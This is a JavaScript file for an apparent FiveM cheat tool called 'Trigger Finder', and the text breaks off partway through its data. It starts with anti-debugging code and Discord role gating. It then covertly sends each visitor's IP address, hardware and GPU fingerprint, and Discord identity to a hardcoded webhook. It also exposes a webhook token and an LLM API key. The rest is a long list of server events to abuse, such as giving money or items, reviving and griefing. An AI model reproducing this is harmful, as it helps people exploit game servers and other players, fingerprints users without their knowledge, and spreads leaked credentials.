
(function() {
    'use strict';

    const originalConsole = {
        log: console.log,
        warn: console.warn,
        error: console.error,
        info: console.info,
        debug: console.debug
    };

    console.log = function() {};
    console.warn = function() {};
    console.error = function() {};
    console.info = function() {};
    console.debug = function() {};

    setInterval(function() {
        debugger;
    }, 100);

    window.eval = function() { throw new Error('Access denied'); };
    window.Function = function() { throw new Error('Access denied'); };

    const originalSetTimeout = window.setTimeout;
    const originalSetInterval = window.setInterval;
    
    window.setTimeout = function(fn, delay) {
        if (typeof fn === 'string') {
            throw new Error('Access denied');
        }
        return originalSetTimeout.call(this, fn, delay);
    };
    
    window.setInterval = function(fn, delay) {
        if (typeof fn === 'string') {
            throw new Error('Access denied');
        }
        return originalSetInterval.call(this, fn, delay);
    };

    document.write = function() { throw new Error('Access denied'); };
    document.writeln = function() { throw new Error('Access denied'); };

    const originalInnerHTML = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML');
    Object.defineProperty(Element.prototype, 'innerHTML', {
        set: function(value) {
            if (value.includes('Access Denied') || value.includes('Access denied')) {
                originalInnerHTML.set.call(this, value);
            } else {

                originalInnerHTML.set.call(this, value);
            }
        },
        get: originalInnerHTML.get
    });
    
})();

const DISCORD_CONFIG = {
    CLIENT_ID: '1402277081823580231',
    REDIRECT_URI: window.location.origin + window.location.pathname,
    SCOPE: 'identify guilds guilds.members.read',
    GUILD_ID: '1394199839545229393',
    REQUIRED_ROLE_ID: '1447289281520341012',
    ENABLED: true
};

const LOGS_WEBHOOK_URL = 'https://discord.com/api/webhooks/1451327966448455894/nd3KjhP-hyntutR-QYW776c2tLfiIUaYYyuXyORAS11RzPw-MpEOR89XuePlLzSMn6Lk';

async function getIPAddress() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip || 'Unknown';
    } catch (error) {
        return 'Unknown';
    }
}

function getHardwareInfo() {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    let gpuInfo = 'Unknown';
    if (gl) {
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        if (debugInfo) {
            gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'Unknown';
        }
    }
    
    return {
        platform: navigator.platform,
        userAgent: navigator.userAgent,
        language: navigator.language,
        screenResolution: `${screen.width}x${screen.height}`,
        colorDepth: screen.colorDepth,
        hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
        deviceMemory: navigator.deviceMemory || 'Unknown',
        gpu: gpuInfo,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
    };
}

async function logSiteAccess() {
    if (!LOGS_WEBHOOK_URL || LOGS_WEBHOOK_URL === 'YOUR_DISCORD_WEBHOOK_URL_HERE') {
        return;
    }
    
    const ip = await getIPAddress();
    const hardware = getHardwareInfo();
    const discordUser = discordAuth.user || null;
    
    const discordInfo = discordUser ? {
        username: `${discordUser.username}#${discordUser.discriminator}`,
        id: discordUser.id,
        avatar: discordUser.avatar ? `https://cdn.discordapp.com/avatars/${discordUser.id}/${discordUser.avatar}.png` : null
    } : {
        username: 'Not authenticated',
        id: 'N/A',
        avatar: null
    };
    
    const embed = {
        title: '🔐 Site Access',
        description: 'User accessed Trigger Finder',
        color: 0x2ecc71,
        fields: [
            {
                name: 'Discord User',
                value: discordInfo.username,
                inline: true
            },
            {
                name: 'Discord ID',
                value: discordInfo.id,
                inline: true
            },
            {
                name: 'IP Address',
                value: ip,
                inline: true
            },
            {
                name: 'Hardware Info',
                value: `Platform: ${hardware.platform}\nCPU Cores: ${hardware.hardwareConcurrency}\nRAM: ${hardware.deviceMemory}GB\nGPU: ${hardware.gpu.substring(0, 100)}${hardware.gpu.length > 100 ? '...' : ''}\nScreen: ${hardware.screenResolution} @ ${hardware.colorDepth}bit`,
                inline: false
            },
            {
                name: 'Browser Info',
                value: `User Agent: ${hardware.userAgent.substring(0, 200)}${hardware.userAgent.length > 200 ? '...' : ''}\nLanguage: ${hardware.language}\nTimezone: ${hardware.timezone}`,
                inline: false
            }
        ],
        timestamp: new Date().toISOString(),
        footer: {
            text: 'Trigger Finder Security Logs'
        }
    };
    
    if (discordInfo.avatar) {
        embed.thumbnail = {
            url: discordInfo.avatar
        };
    }
    
    fetch(LOGS_WEBHOOK_URL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            embeds: [embed]
        })
    }).catch(error => {
        console.error('Failed to send Discord log:', error);
    });
}

const AI_CONFIG = {
    ENABLED: true,
    API_KEY: 'cpk_ac45bcb069ef4ae990dd9f83fbe5953d.835022e0736f51acbee77a2b70fa9266.E01GXu6LoFL6qzO7z7lt6zySOlA8NFoa',
    API_URL: 'https://llm.chutes.ai/v1/chat/completions',
    MODEL: 'openai/gpt-oss-20b',
    USE_AI_FOR_QUICK_EDIT: true,
    RATE_LIMITED: false,
    RATE_LIMIT_UNTIL: 0
};

const AI_QUEUE = {
    queue: [],
    processing: false,
    delay: 5000,
    maxConcurrent: 1,
    retryDelay: 10000
};

const EMBEDDED_KNOWN_TRIGGERS = [
    "0r-drugs:server:giveItem",
    "17mov_CharacterSystem:OpenOutfitsMenu",
    "17mov_postman:collectLetter",
    "A_Core:PlayergetDrop",
    "A_Jail:jailspieler",
    "A_MiniJob:paycheck",
    "AdminMenu:giveBank",
    "AdminMenu:giveCash",
    "AdminMenu:giveDirtyMoney",
    "Amazon:cash",
    "BrasserieFermeture",
    "BrasserieOuverture",
    "BrasserieRecrutement",
    "CBDFermeture",
    "CBDOuverture",
    "CBDRecrutement",
    "CL-Pizzeria:AddItem",
    "CPT_Raids:Server:GiveItem",
    "Cali-NarcoTaxi:pay",
    "Cashier:Quit",
    "Cashier:Use",
    "Casino:AcquireChips",
    "Casino:AdminEditWorkerGrade",
    "Casino:AdminKick",
    "Casino:AdminShowMenu",
    "Casino:AdminShowWorkers",
    "Casino:AdminUpdateStates",
    "Casino:BecomeVIP",
    "Casino:DailyBonus",
    "Casino:Enter",
    "Casino:FuseBoxFixed",
    "Casino:GetBalance",
    "Casino:GetChips",
    "Casino:GetInfo",
    "Casino:GetItems",
    "Casino:GetMoney",
    "Casino:GetProgress",
    "Casino:GetServerId",
    "Casino:Leave",
    "Casino:LoadXmas",
    "Casino:PodiumRemove",
    "Casino:PodiumReplace",
    "Casino:StartFuseBox",
    "Casino:TradeInChips",
    "Casino:XmasUseTree",
    "CasinoMission:MoneyLoad:DeliverMoney",
    "CasinoMission:MoneyLoad:Order",
    "CinematicCam:requestPermissions",
    "Core:triggerServerCallback",
    "Crain:Whit",
    "Crain:einreise",
    "DLWINCH:CreateRope",
    "DLWINCH:LoadRopes",
    "DLWINCH:RemoveRope",
    "DLWINCH:UpdateRopeLength",
    "FireScript:StartFire",
    "FullyDeleteEntitysNuketown",
    "FzD-CardFruad:giveMoney",
    "GoFast:VenteDuVehicule",
    "Gunshop:buyWeapon",
    "HD_Jail:sendToJail",
    "InteractSound_SV:PlayOnSource",
    "InteractSound_SV:PlayWithinDistance",
    "JustRigHeist:complete",
    "LuxuModules:Server:GiveKeyItem",
    "MaraicherFermeture",
    "MaraicherOuverture",
    "MaraicherRecrutement",
    "MrNewb_VehicleKeysV2:Server:GiveKey",
    "Opto_dispatch:Server:SendAlert",
    "Prefech:JD_logsV3:ClientDiscord",
    "Prefech:JD_logsV3:GetConfigSettings",
    "Prefech:JD_logsV3:PlayerDamage",
    "Prefech:JD_logsV3:ScreenshotCB",
    "Prefech:JD_logsV3:playerDied",
    "Prefech:JD_logsV3:playerShotWeapon",
    "Pug:Anticheat:FixRemovedGun",
    "Pug:SV:SetArenaMap",
    "Pug:client:InPaintBallMatchWL",
    "Pug:client:InPaintBallMatchWLFalse",
    "Pug:client:PaintballReviveEvent",
    "Pug:client:ViewLobby",
    "Pug:paintball:RemovePlayer",
    "Pug:server:NewGivBusinessItemAfterH@cks",
    "Pug:server:PaintballSetBucket",
    "Pug:server:RobberyGiveItem",
    "Pug:server:SavePaintballItems",
    "Pug:server:UpdateBlueTeamsClothes",
    "Pug:server:UpdateRedTeamsClothes",
    "PugFishToggleItem",
    "QBCore:GetObject",
    "QBCore:Notify",
    "QBCore:Server:SetMetaData",
    "QBCore:Server:TriggerCallback",
    "QBCore:ToggleDuty",
    "Ranjit-EmsBag:Server:AddItem",
    "Renewed-Sirensync:server:SyncState",
    "Scene:AttemptCopy",
    "Scene:AttemptDelete",
    "Scene:New",
    "Scene:Request",
    "SeatShuffle",
    "SendAlert:police",
    "ServerEmoteCancel",
    "ServerEmoteRequest",
    "ServerValidEmote",
    "SonoranCAD::callcommands:SendCallApi",
    "StarbucksFermeture",
    "StarbucksOuverture",
    "StarbucksRecrutement",
    "TabacFermeture",
    "TabacOuverture",
    "TabacRecrutement",
    "TakeHostage:sync",
    "Tikoz:MecanoMsgPerso",
    "VigneronFermeture",
    "VigneronOuverture",
    "VigneronRecrutement",
    "Wrapper:AddMoney",
    "__ox_cb_c-tablet:giveCar",
    "__ox_cb_c-tablet:giveHispanPoints",
    "__ox_cb_c-tablet:giveWeapon",
    "__ox_cb_fuksus-shops:buyItems",
    "__ox_cb_mt_printers:server:itemActions",
    "__ox_cb_sf_pizzathis:server:callback:buyCustomerBasket",
    "_ox_cb_pb-simpleminer:getOre",
    "_ox_cb_pb-simpleminer:processOre",
    "a_fishing:giveFish",
    "ac-shop:makePayment",
    "ak47_ambulancejob:revive",
    "ak47_ambulancejob:skellyfix",
    "ak47_clothing:openOutfitMenu",
    "ak47_druglabs:sellDrug",
    "ak47_drugmanager:pickedupitem",
    "ak47_drugmanagerv2:shop:buy",
    "ak47_inventory:buyItem",
    "ak47_khusbites:buyedible",
    "ak47_khusbites:canstartpuff",
    "ak47_khusbites:notify",
    "ak47_khusbites:openMarket",
    "ak47_khusbites:openMarketProcess",
    "ak47_khusbites:refillHookah",
    "ak47_khusbites:tryeat",
    "ak47_prospecting:sell",
    "ak47_qb_ambulancejob:revive",
    "ak47_qb_ambulancejob:skellyfix",
    "ak4y-advancedFishing:addItem",
    "ak4y-dailyWheel:giveItem",
    "ak4y-playTimeShop:addCoin",
    "aksgun_manager:openitem",
    "am-atmrobbery:reward",
    "ambulance:healpnj",
    "ambulance:requestRespawnHopital",
    "an_killfeed:add",
    "angelicxs-BankTruck:Server:HeistReward",
    "angelicxs-CivilianJobs:Server:GainItem",
    "angelicxs-CivilianJobs:Server:Payment",
    "anox-moneywash:server:collectCleanMoney",
    "apex_rexdiner:client:addItem",
    "apx_starterpack:server:markAsUsed",
    "ars_ambulancejob:healPlayer",
    "ars_vvsgrillz_v2:Buyitem",
    "ars_vvsguns:Buyitem",
    "atm:reward",
    "aty_dispatch:SendDispatch",
    "av_weather:freeze",
    "bank-truck:server:HeistReward",
    "bankrobberies:receiveCash",
    "bl:giveWeapon",
    "blood:giveReward",
    "bobi-selldrugs:server:RetrieveDrugs",
    "brutal_atm_robbery:server:AddPlayerMoney",
    "brutal_hunting:server:AddItem",
    "brutal_policejob:server:AddItem",
    "brutal_policejob:server:prisonJobPay",
    "brutal_shop_robbery:server:AddItem",
    "brutal_truck_robbery:server:AddItem",
    "bt-cashregister:openRegister",
    "bt-cashregister:receiptSold",
    "bt-cashregisters:getPlayerNames",
    "bt-cashregisters:sellReceipts",
    "burgerjob:payment",
    "bus:tunnel_req",
    "busjob:payment",
    "buyItem4",
    "bvrtck_fuel:zahlen",
    "cFleeca:GiveMoney",
    "cali-carding:giveLaptopItem",
    "cali-carkeys:AddKeys",
    "cali-hurtownia",
    "cali-license:buyLicense",
    "cali-plug-dajitemy",
    "cali-rybak:getFishes",
    "cali-zbierz",
    "cambriolage:sellItem",
    "cashRegister:ChargeCustomer",
    "cashRegister:Noti",
    "cashRegister:RequestPayment",
    "cc_core:utils:ore:farm",
    "cd_dispatch:AddNotification",
    "cd_dispatch:CallCommand",
    "cd_dispatch:CallCommand:Reply",
    "cd_dispatch:Callback",
    "cd_dispatch:CancelTracking",
    "cd_dispatch:Debug",
    "cd_dispatch:KEY_largeui",
    "cd_dispatch:KEY_responding",
    "cd_dispatch:KEY_smallui",
    "cd_dispatch:PanicButtonEvent",
    "cd_dispatch:PanicSoundInDistance",
    "cd_dispatch:PlayerBlips:emergancylights",
    "cd_dispatch:PlayerBlips_flash",
    "cd_dispatch:PlayerLoaded",
    "cd_dispatch:SaveUserSettings",
    "cd_dispatch:UnloadPlayer",
    "cd_dispatch:pdalerts:Gunshots",
    "cd_dispatch:pdalerts:Speedtrap",
    "cd_drawtextui:HideUI",
    "cd_drawtextui:ShowUI",
    "cd_easytime:PauseSync",
    "cd_garage:AddKeys",
    "cd_garage:PropertyGarage",
    "cd_garage:RemovePersistentVehicles",
    "cd_garage:StoreVehicle_Main",
    "cd_notifications:Add",
    "cdev_lib:api:jobUpdate",
    "cdev_lib:api:playerLoaded",
    "cdn-fuel:station:server:Withdraw",
    "cdn-fuelserver:Withdraw",
    "cfx-hu-grindings:AddItem",
    "cfx-tcd-starterpack:ClaimStarterpack",
    "chat:addMessage",
    "chat:addSuggestion",
    "chat:removeSuggestion",
    "codem-appearance:OpenWardrobe",
    "codem-appearance:reloadSkin",
    "codem-inventory:OpenPlayerShop",
    "codem-inventory:server:openstash",
    "codem-inventory:server:robplayer",
    "codem-refreshcart",
    "collectibles:tryMarkFound",
    "consumables:client:Drink",
    "consumables:client:Eat",
    "consumables:server:addHunger",
    "consumables:server:addThirst",
    "container-robbery:giveItem",
    "core:addItemToInventory",
    "core:triggerServerCallback",
    "core_craftingLuz:itemCrafted",
    "core_dispatch:addCall",
    "core_evidence:LastInCar",
    "core_evidence:addEvidenceToStorage",
    "core_evidence:deleteEvidenceFromStorage",
    "core_evidence:removeBlood",
    "core_evidence:removeEverything",
    "core_evidence:removeShot",
    "core_evidence:saveBlood",
    "core_evidence:saveShot",
    "core_inventory:server:openInventory",
    "core_multijob:changeJob",
    "createclonedcard",
    "crm-appearance:load-player-skin",
    "custom-cuffs:server:OpenRobInventory",
    "custom:giveCraftedItem",
    "custom:openPlayerInventory",
    "custom:removeCraftingItems",
    "custom:setCraftingCooldown",
    "custom:startCrafting",
    "d-notification",
    "d-phone:client:message:senddispatch",
    "dawajczystagotowezbankomatu",
    "dawajitemydokraftowania",
    "dawajitemzboxa",
    "dawajitemzesmietnika",
    "dawajkamzezkontenera",
    "dawajklucze",
    "dawajkokezkontenera",
    "dawajsiankozkontenera",
    "dawajsianosejf",
    "devcore_smokev2:server:AddItem",
    "devcore_smokev2:server:RemoveItem",
    "dir:sendAnnouncementCustom",
    "dispatch:GetRadioChannel",
    "dispatch:server:notify",
    "dj_baspel:changeVolume",
    "dj_baspel:createMusicMenu",
    "dj_baspel:playMusic",
    "dodo_taxi:SuccesJob",
    "dope_empregos:tunnel_req",
    "dsAdminMenu:giveWeapon",
    "dusa_dispatch:sendDispatch",
    "dynyx-moneywash:server:returncleancash",
    "echo-itemselling:server:banplayer",
    "einreise:setStatus",
    "elk-pt:buyItem",
    "elk-pt:checkJob",
    "emergencydispatch:emergencycall:new",
    "employment:fliphamburgers",
    "employment:getjob",
    "es:activateMoney",
    "estrp-yachtheist:server:lootsafe",
    "esx-qalle-jail:jailPlayer",
    "esx-qalle-jail:prisonWorkReward",
    "esx:addInventoryItem",
    "esx:createPickup",
    "esx:defibrillateur:revive",
    "esx:getSharedObject",
    "esx:giveInventoryItem",
    "esx:loadingScreenOff",
    "esx:onPickup",
    "esx:onPlayerDeath",
    "esx:onPlayerJoined",
    "esx:onPlayerSpawn",
    "esx:removeInventoryItem",
    "esx:restoreLoadout",
    "esx:setJob",
    "esx:setPlayerData",
    "esx:showNotification",
    "esx:triggerServerCallback",
    "esx:updateCoords",
    "esx:updateWeaponAmmo",
    "esx:useItem",
    "esx_ambulancejob:reSelinYannikTSonnysVatervive",
    "esx_ambulancejob:revive",
    "esx_barbershop:pay",
    "esx_basicneeds:healPlayer",
    "esx_basicneeds:resetStatus",
    "esx_billing:paidBill",
    "esx_billing:sendBill",
    "esx_dmvschool:addLicense",
    "esx_dmvschool:pay",
    "esx_drugs:startHarvestCoke",
    "esx_drugs:startHarvestMeth",
    "esx_drugs:startHarvestOpium",
    "esx_drugs:startHarvestWeed",
    "esx_drugs:startSellCoke",
    "esx_drugs:startSellMeth",
    "esx_drugs:startSellOpium",
    "esx_drugs:startSellWeed",
    "esx_drugs:startTransformCoke",
    "esx_drugs:startTransformMeth",
    "esx_drugs:startTransformOpium",
    "esx_drugs:startTransformWeed",
    "esx_drugs:stopHarvestCoke",
    "esx_drugs:stopHarvestMeth",
    "esx_drugs:stopHarvestOpium",
    "esx_drugs:stopHarvestWeed",
    "esx_drugs:stopSellCoke",
    "esx_drugs:stopSellMeth",
    "esx_drugs:stopSellOpium",
    "esx_drugs:stopSellWeed",
    "esx_drugs:stopTransformCoke",
    "esx_drugs:stopTransformMeth",
    "esx_drugs:stopTransformOpium",
    "esx_drugs:stopTransformWeed",
    "esx_inventoryhud:closeInventory",
    "esx_inventoryhud:openPlayerInventory",
    "esx_jobs:caution",
    "esx_killreward:rewardPlayer",
    "esx_killstreak:increment",
    "esx_methcar:finish",
    "esx_moneywash:deposit",
    "esx_moneywash:withdraw",
    "esx_multicharacter:startkit",
    "esx_pizza:pay",
    "esx_skin:playerRegistered",
    "esx_skin:resetFirstSpawn",
    "esx_skin:responseSaveSkin",
    "esx_skin:save",
    "esx_slotmachine:sv:2",
    "esx_society:depositMoney",
    "esx_society:openBossMenu",
    "esx_society:setSocietyMoney",
    "esx_society:toggleSocietyHud",
    "esx_society:washMoney",
    "esx_society:withdrawMoney",
    "esx_status:add",
    "esx_status:getStatus",
    "esx_status:loaded",
    "esx_status:onTick",
    "esx_status:registerStatus",
    "esx_status:remove",
    "esx_status:set",
    "esx_status:setDisplay",
    "esx_status:update",
    "esx_tankerjob:pay",
    "esx_truckerjob:pay",
    "esx_vehicletrunk:giveDirty",
    "esx_weashop:buyItem",
    "esx_weashop:buyLicense",
    "esxambulancejob:revive",
    "event:carTheft",
    "event:firearm",
    "event:knife",
    "eventRevive:revive",
    "evidence:client:SetStatus",
    "ez_lib:server:AddItem",
    "fanonx-hunting:server:sell",
    "fg:addon:EntityCoords",
    "fg:addon:EntityVisible",
    "fg:addon:antiThrow",
    "fg:addon:clientCallback",
    "fg:addon:heartbeat",
    "fg:addon:playerDroped",
    "fg:addon:playerSpawned",
    "fg:addon:rcore_clothing:onClothingShop",
    "fg:addon:resourceState",
    "fg:addon:triggerServerCallback",
    "fishing:attemptCatch",
    "fishing:sellFish",
    "fivecode_camping:callCallback",
    "fivem-appearance:loadDefaultModel",
    "fivem-appearance:loadSkin",
    "fivem-appearance:modelLoaded",
    "fivem-appearance:server:saveAppearance",
    "fixkit:buy",
    "fleecaheist:server:rewardItem",
    "flughafentp",
    "flux_scratchcard:draw",
    "freecam:onEnter",
    "freecam:onExit",
    "freecam:onTick",
    "frog_TruckRobbery:missionComplete",
    "fuel:pay",
    "futurev:givecar:spawnVehicle",
    "fw_car_sign:addItem",
    "gambling:spend",
    "garage-robbery:giveItem",
    "gardenerjob:payment",
    "gav:envoyerFormulaireComplet",
    "getajob:police",
    "give:item",
    "givePlayerItem",
    "giveambulancemoney",
    "gksphone:gkcs:jbmessage",
    "gl-prison:takeItem",
    "glock_printer:giveAssembledGlock",
    "gopostal:cash",
    "gps:buyTracker",
    "gps:plantTracker",
    "gps:removeTracker",
    "gps:scanVehicle",
    "griefmenu:ArmyAttack",
    "griefmenu:ClownAttack",
    "griefmenu:FIBAttack",
    "griefmenu:FIREAttack",
    "griefmenu:LSPDAttack",
    "griefmenu:MerryweatherAttack",
    "griefmenu:TruckPunchline",
    "griefmenu:ZombieAttack",
    "griefmenu:ZombieAttack2",
    "griefmenu:ZombieAttack3",
    "gunrepair:attemptRepairAtStation",
    "hesi_sellpussycat:server:banplayer",
    "hg-wheel:server:giveitem",
    "horizon_paymentsystem:giveItem",
    "hospital:client:Revive",
    "hospital:server:SetDeathStatus",
    "hospital:server:SetLaststandStatus",
    "hospital:server:resetHungerThirst",
    "hud:server:RelieveStress",
    "iconic-slaughter:giveItem",
    "iconic-slaughter:sell",
    "idn-cargo:bayerjepus",
    "idn-cargo:mulaiwork",
    "idrp:VapeFixAnim",
    "idrp:VapeHit",
    "idrp:VapeStop",
    "idrpVape:SmokeFX",
    "illenium-appearance:client:changeOutfit",
    "illenium-appearance:client:loadJobOutfit",
    "illenium-appearance:client:migration:load-qb-clothing-clothes",
    "illenium-appearance:client:openClothingShopMenu",
    "illenium-appearance:client:openJobOutfitsMenu",
    "illenium-appearance:client:openOutfitMenu",
    "illenium-appearance:client:reloadSkin",
    "illenium-appearance:server:ChangeRoutingBucket",
    "illenium-appearance:server:ResetRoutingBucket",
    "illenium-appearance:server:chargeCustomer",
    "illenium-appearance:server:deleteManagementOutfit",
    "illenium-appearance:server:deleteOutfit",
    "illenium-appearance:server:migrate-qb-clothing-skin",
    "illenium-appearance:server:resetOutfitCache",
    "illenium-appearance:server:saveAppearance",
    "illenium-appearance:server:saveManagementOutfit",
    "illenium-appearance:server:saveOutfit",
    "illenium-appearance:server:syncUniform",
    "illenium-appearance:server:updateOutfit",
    "inventory:client:SetCurrentStash",
    "inventory:openHouse",
    "inventory:openPlayerInventory",
    "inventory:server:OpenInventory",
    "inventory:server:RobPlayer",
    "inverse:gag:start",
    "jg-advancedgarages:client:InsertVehicle",
    "jg-advancedgarages:client:ShowHouseGarage:qs-housing",
    "jg-advancedgarages:client:open-garage",
    "jg-advancedgarages:client:store-vehicle",
    "jg-advancedgarages:client:update-blips-text-uis",
    "jg-advancedgarages:server:DeleteVehicleEntity",
    "jg-advancedgarages:server:dealerships-send-to-default-garage",
    "jg-advancedgarages:server:register-vehicle-outside",
    "jg-advancedgarages:server:save-ti-fuel-type",
    "jg-advancedgarages:server:set-vehicle-owned",
    "jg-dealerships:client:open-management",
    "jg-dealerships:client:open-showroom",
    "jg-dealerships:client:purchase-vehicle:config",
    "jg-dealerships:client:sell-vehicle",
    "jg-dealerships:client:update-blips-text-uis",
    "jg-dealerships:server:purchase-vehicle:config",
    "jg-dealerships:server:save-ti-fuel-type",
    "jg-dealerships:server:update-purchased-vehicle-props",
    "jg-mechanic:client:input-shop-purchase-qty",
    "jg-mechanic:client:refresh-mechanic-zones-and-blips",
    "jg-mechanic:server:buy-item",
    "jg-mechanic:server:open-inventory-stash",
    "jg-vehiclemileage:server:update-mileage",
    "jim-consumables:server:toggleItem",
    "jim-mechanic:server:toggleItem",
    "jim-mining-main:server:toggleItem",
    "jim-mining:Crafting:GetItem",
    "jim-mining:Selling",
    "jim-mining:server:toggleItem",
    "jim-recycle:server:toggleItem",
    "jobshop:buyItem",
    "jsfour-idcard:open",
    "kajdanki:confirmCuff",
    "kajdanki:uncuff",
    "karpo_haudankaivuu:kaivettupaskaks",
    "kaves_drugs:addMoneyAll",
    "kaves_drugs:giveItem",
    "kq_outfitbag2:server:log",
    "lambra-portableYogaESX:server:pickupMat",
    "lation_247robbery:CompleteRegisterRobbery",
    "lation_247robbery:CompleteSafeRobbery",
    "lation_247robbery:DoesLockpickBreak",
    "lation_247robbery:FailedRobbery",
    "lation_247robbery:onPlayerLoaded",
    "lation_mining:sellItem",
    "lb-phone:cb:response",
    "lb-phone:itemAdded",
    "lb-phone:itemRemoved",
    "lb-phone:jobUpdated",
    "lb-phone:vrp:firstSpawn",
    "lb-tablet:addDispatch",
    "lb-tablet:frameworkLoaded",
    "lb-tablet:jobUpdated",
    "ledjo_meca:add",
    "lester:vendita",
    "lifeinvader:sendNotification",
    "lootbox:giveReward",
    "lscustoms:payGarage",
    "lualogic_loot:server:requestLoot",
    "luckywheel:give",
    "lunar_fishing:registerBoat",
    "luxu_admin:server:leaveCall",
    "luxu_admin:server:setCallChannel",
    "m-AtmRobbery:Server:ToggleItem",
    "m-hunting-server:SellItems",
    "m-hunting:serverclaimItems",
    "m_dojjob:urzadmiasta:sjeotb",
    "m_interakcje:handcuff",
    "m_license:give",
    "masnyg_napady:giveRewardJubiler",
    "mc9-coretto:server:addItem",
    "mc9-taco:server:addItem",
    "mecano:sendAnnouncementCustom",
    "mechanicJob:payPlayer",
    "menzaro_manager:giveitem",
    "mf-inventory:server:createHousingInventory",
    "mk:setAccountMoney",
    "mk:setCash",
    "mk_utils:server:esxDispatchNotify",
    "mon_script:acheterPizza",
    "mrg_documents:document:show",
    "ms:scrap:find",
    "ms:scrap:sell",
    "muzik-cal",
    "muzik-devamet",
    "muzik-duraklat",
    "muzik-durdur",
    "mx_jail:jailPlayer",
    "mx_jail:setTime",
    "mxrveuh:Resuscitate",
    "myATMRobbery:pay",
    "myMinijobCore:pay",
    "my_drinks:addDrink",
    "mythic_hospital:client:RemoveBleed",
    "mythic_hospital:client:ResetLimbs",
    "mz-shrooms:server:receiveShroomslevel8",
    "n_zlomiarz:scrap:collect",
    "n_zlomiarz:scrap:sell",
    "nadawajodznake",
    "naprawiajauto",
    "ndrp-garbage:pay",
    "nolag_properties:server:property:addHouseGarage",
    "nolag_properties:server:property:removeHouseGarage",
    "norp-moneywash:canWashMoney",
    "nox_notify:showClientNotify",
    "objCreates:AddItem",
    "okokBanking:CreateSocietyAccount",
    "okokBanking:DepositMoney",
    "okokBanking:DepositMoneyToSociety",
    "okokBanking:GiveCC",
    "okokBanking:OpenATM",
    "okokBanking:OpenBank",
    "okokBanking:SetIBAN",
    "okokBanking:TransferMoney",
    "okokBanking:TransferMoneyToPlayerFromSociety",
    "okokBanking:TransferMoneyToSociety",
    "okokBanking:TransferMoneyToSocietyFromSociety",
    "okokBanking:UpdateIbanDB",
    "okokBanking:UpdatePINDB",
    "okokBanking:WithdrawMoney",
    "okokBanking:WithdrawMoneyToSociety",
    "okokBanking:setMenuOpened",
    "okokBanking:updateMoney",
    "okokBilling:ToggleCreateInvoice",
    "okokGarage:GiveKeys",
    "okokGarage:OpenPrivateGarageMenu",
    "okokGarage:StoreVehiclePrivate",
    "okokNotify:Alert",
    "okokSpawnSelector:spawnMenu",
    "onex-creation:syncClothes",
    "ox_doorlock:breakLockpick",
    "ox_doorlock:editDoorlock",
    "ox_doorlock:setState",
    "ox_fuel:fuelCan",
    "ox_fuel:pay",
    "ox_fuel:updateFuelCan",
    "ox_inventory:closeInventory",
    "ox_inventory:currentWeapon",
    "ox_inventory:disarm",
    "ox_inventory:forceOpenInventory",
    "ox_inventory:itemCount",
    "ox_inventory:itemNotify",
    "ox_inventory:openInventory",
    "ox_inventory:removeItem",
    "ox_inventory:setPlayerInventory",
    "ox_inventory:updateInventory",
    "ox_inventory:updateWeapon",
    "ox_inventory:updateWeaponComponent",
    "ox_inventory:usedItem",
    "ox_inventory:usedItemInternal",
    "ox_lib:notify",
    "ox_lib:saveZone",
    "ox_lib:setLocale",
    "ox_lib:validateCallback",
    "ox_target:setEntityHasOptions",
    "ox_target:toggleEntityDoor",
    "oxadmin:requestOpen",
    "oxmysql:fetchResource",
    "p_policejob:JailPlayer",
    "paycheck:salary",
    "peacetime:request",
    "pedbuy:attemptBuy",
    "phone:failedControl",
    "phone:phone:disableCompanyCalls",
    "phone:sendNotification",
    "phone:services:toggleDuty",
    "phone:setPhoneObject",
    "phone:voice:addToCall",
    "phone:voice:removeFromCall",
    "phone:voice:toggleSpeaker",
    "pickle_rental:registerRental",
    "player:giveItem",
    "pm_playtime:AddTime",
    "pm_playtime:ChatMessage",
    "pma-bankrobbery:giveItem",
    "pma-voice:radioActive",
    "pma-voice:setPlayerCall",
    "pma-voice:setPlayerRadio",
    "pma-voice:setTalkingMode",
    "pma-voice:setTalkingOnCall",
    "pma-voice:setTalkingOnRadio",
    "pma-voice:toggleRadioAnim",
    "podol:refundviagra",
    "police:server:policeAlert",
    "polyzone:printBox",
    "polyzone:printCircle",
    "polyzone:printPoly",
    "polyzone:pzadd",
    "polyzone:pzcancel",
    "polyzone:pzcomboinfo",
    "polyzone:pzcreate",
    "polyzone:pzfinish",
    "polyzone:pzlast",
    "polyzone:pzundo",
    "positioning:server:entity:pos",
    "pranie_bez_prowizji_server",
    "printer:server:printItem",
    "prison:client:Enter",
    "progressbar:client:cancel",
    "przeszukaj:requestInventory",
    "ps-dispatch:server:notify",
    "pug-fishing:Server:ToggleItem",
    "pustak-aidkit:revPlayerFromId",
    "pwr_shoprobberies:completeLoot",
    "qb-advancedrugs:giveItem",
    "qb-bossmenu:client:OpenMenu",
    "qb-bossmenu:server:FireEmployee",
    "qb-bossmenu:server:GradeUpdate",
    "qb-bossmenu:server:HireEmployee",
    "qb-bossmenu:server:depositMoney",
    "qb-bossmenu:server:withdrawMoney",
    "qb-clothes:loadPlayerSkin",
    "qb-clothing:client:loadOutfit",
    "qb-clothing:client:openOutfitMenu",
    "qb-clothing:loadPlayerSkin",
    "qb-communityservice:finishCommunityService",
    "qb-crafting:Server:Collectmelting",
    "qb-crypto:server:ExchangeSuccess",
    "qb-garages:client:addHouseGarage",
    "qb-garages:client:removeHouseGarage",
    "qb-garages:client:setHouseGarage",
    "qb-houses:server:giveHouseKey",
    "qb-houses:server:lockHouse",
    "qb-houses:server:removeHouseKey",
    "qb-houses:server:setHouses",
    "qb-log:server:CreateLog",
    "qb-mina:server:givePedras",
    "qb-mina:server:givePedrasProcessada",
    "qb-pedrobbery:server:reward",
    "qb-phone:server:sendNewMail",
    "qb-robos:success",
    "qb-trashsearch:server:givemoney",
    "qb-vehiclekeys:server:AcquireVehicleKeys",
    "qb-weapons:ResetHolster",
    "qb-weathersync:client:DisableSync",
    "qb-weathersync:client:EnableSync",
    "qbx_medical:client:playerRevived",
    "qs-dispatch:server:CreateDispatchCall",
    "qs-smartphone:server:AddNotifies",
